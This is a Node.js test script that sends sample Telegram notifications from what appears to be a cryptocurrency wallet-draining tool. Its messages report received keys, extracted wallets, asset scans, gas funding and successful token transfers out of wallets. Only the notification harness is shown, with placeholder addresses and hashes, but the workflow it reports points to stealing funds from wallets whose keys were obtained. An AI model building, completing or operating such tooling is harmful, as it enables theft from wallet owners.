// Test Telegram bot notifications
// Load environment variables manually
const fs = require('fs');
const path = require('path');

// Try to load .env file
const envPath = path.join(__dirname, '.env');
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split('\n').forEach(line => {
    const match = line.match(/^([^=]+)=(.*)$/);
    if (match) {
      const key = match[1].trim();
      const value = match[2].trim().replace(/^["']|["']$/g, '');
      if (!process.env[key]) {
        process.env[key] = value;
      }
    }
  });
}

const { TelegramNotifier } = require('./src/services/telegramNotifier');

async function testTelegram() {
  console.log('🧪 Testing Telegram notifications...\n');
  
  const notifier = new TelegramNotifier();
  
  if (!notifier.enabled) {
    console.error('❌ Telegram is disabled!');
    console.log('Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env file');
    process.exit(1);
  }
  
  console.log('✅ Telegram configured');
  console.log(`   Bot Token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Set ✓' : 'Missing ✗'}`);
  console.log(`   Chat ID: ${process.env.TELEGRAM_CHAT_ID ? 'Set ✓' : 'Missing ✗'}\n`);
  
  // Test 1: Key Received
  console.log('📤 Sending test: Key Received...');
  const result1 = await notifier.sendKeyReceived('0xf39Fd6e5a5106c8B9aa797964955AF98DF3FCEC9', 'Test');
  console.log(`   Result: ${result1 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 2: Wallet Extracted
  console.log('📤 Sending test: Wallet Extracted...');
  const result2 = await notifier.sendWalletExtracted('0xf39Fd6e5a5106c8B9aa797964955AF98DF3FCEC9');
  console.log(`   Result: ${result2 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 3: Scanning Started
  console.log('📤 Sending test: Scanning Started...');
  const result3 = await notifier.sendScanningStarted();
  console.log(`   Result: ${result3 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 4: Network Assets
  console.log('📤 Sending test: Network Assets...');
  const result4 = await notifier.sendNetworkAssets('ethereum', {
    native: { balance: '1.5', symbol: 'ETH' },
    tokens: [
      { balance: '500.00', symbol: 'USDT' },
      { balance: '250.00', symbol: 'USDC' }
    ]
  });
  console.log(`   Result: ${result4 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 5: Gas Reservoir Funding
  console.log('📤 Sending test: Gas Reservoir Funding...');
  const result5 = await notifier.sendGasReservoirFunding('ethereum', '0.001', '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef');
  console.log(`   Result: ${result5 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 6: Transfer Success
  console.log('📤 Sending test: Transfer Success...');
  const result6 = await notifier.sendTransferSuccess('ethereum', 'token', '500.00', 'USDT', '0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890');
  console.log(`   Result: ${result6 ? '✅ Success' : '❌ Failed'}\n`);
  
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test 7: Processing Complete
  console.log('📤 Sending test: Processing Complete...');
  const result7 = await notifier.sendProcessingComplete({
    totalTransfers: 5,
    successful: 4,
    failed: 1,
    totalValue: '4250.75'
  });
  console.log(`   Result: ${result7 ? '✅ Success' : '❌ Failed'}\n`);
  
  console.log('🎉 Telegram test completed!');
  console.log('\n📱 Check your Telegram chat to see all notifications.');
}

testTelegram().catch(console.error);

